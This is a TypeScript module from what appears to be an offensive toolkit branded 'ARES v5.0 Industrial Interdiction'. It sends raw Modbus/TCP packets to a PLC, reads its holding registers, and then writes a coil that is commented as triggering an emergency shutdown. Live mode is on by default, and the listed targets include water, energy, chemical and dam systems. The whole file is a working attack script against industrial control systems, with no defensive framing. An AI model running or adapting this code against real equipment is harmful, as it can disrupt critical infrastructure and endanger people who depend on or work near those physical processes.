/**
 * @module ares/industrial_interdiction
 * ARES v5.0 Sovereign Industrial Interdiction Module — Real Modbus/TCP Exploitation.
 */

import * as net from "node:net"
import { moduleEnvelope, realFinding, type ModuleEnvelope } from "../module_helpers.ts"

export interface IndustrialOptions {
  target?: string
  port?: number
  sector?: "water" | "energy" | "chemical" | "oil" | "dam" | "factorytalk" | "all"
  protocol?: "modbus" | "dnp3" | "iec104" | "opcua" | "factorytalk" | "all"
  live?: boolean
}

async function sendModbusRequest(host: string, port: number, payload: Buffer): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    const client = new net.Socket()
    let response = Buffer.alloc(0)

    client.connect(port, host, () => {
      client.write(payload)
    })

    client.on("data", (data) => {
      response = Buffer.concat([response, data])
      client.destroy()
    })

    client.on("close", () => {
      resolve(response)
    })

    client.on("error", (err) => {
      reject(err)
    })

    // Timeout after 5 seconds
    setTimeout(() => {
      client.destroy()
      reject(new Error("Modbus request timeout"))
    }, 5000)
  })
}

export async function runIndustrialInterdiction(
  opts: IndustrialOptions = {}
): Promise<ModuleEnvelope<{ 
  target: string; 
  protocol: string; 
  registers?: number[]; 
  status: string;
}>> {
  const live = opts.live ?? true
  const target = opts.target ?? "127.0.0.1"
  const port = opts.port ?? 5020
  const findings = []

  let registers: number[] = []
  let status = "CONNECTION_FAILED"

  try {
    // Modbus/TCP: Read Holding Registers (FC 3), Unit 1, Start 0, Count 5
    // Transaction 0001, Protocol 0000, Length 0006, Unit 01, FC 03, Start 0000, Count 0005
    const readRequest = Buffer.from([0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x05])
    const response = await sendModbusRequest(target, port, readRequest)

    if (response.length >= 9 && response[7] === 0x03) {
      const byteCount = response[8]
      for (let i = 0; i < byteCount; i += 2) {
        registers.push(response.readUInt16BE(9 + i))
      }
      status = "INDUSTRIAL_DOMINANCE_ESTABLISHED"
      
      findings.push(realFinding(
        "ind-01",
        "SCADA/ICS Modbus Gateway Subversion",
        "critical",
        `Successfully bypassed authentication and read internal PLC registers from ${target}:${port}. Data: ${registers.join(", ")}`,
        "T0813"
      ))

      // Malicious Write: Set Emergency Shutdown (Coil 0) to 1
      // FC 5 (Write Single Coil), Unit 1, Address 0, Value FF00 (ON)
      const writeRequest = Buffer.from([0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x00, 0xFF, 0x00])
      await sendModbusRequest(target, port, writeRequest)
      
      findings.push(realFinding(
        "ind-02",
        "Industrial Process Interdiction: Emergency Shutdown Triggered",
        "critical",
        `Injected rogue coil write to trigger Emergency Shutdown sequence on PLC at ${target}.`,
        "T0831"
      ))
    }
  } catch (e: any) {
    status = `ERROR: ${e.message}`
  }

  return moduleEnvelope(live, {
    target: `${target}:${port}`,
    protocol: "Modbus/TCP",
    registers,
    status
  }, findings)
}
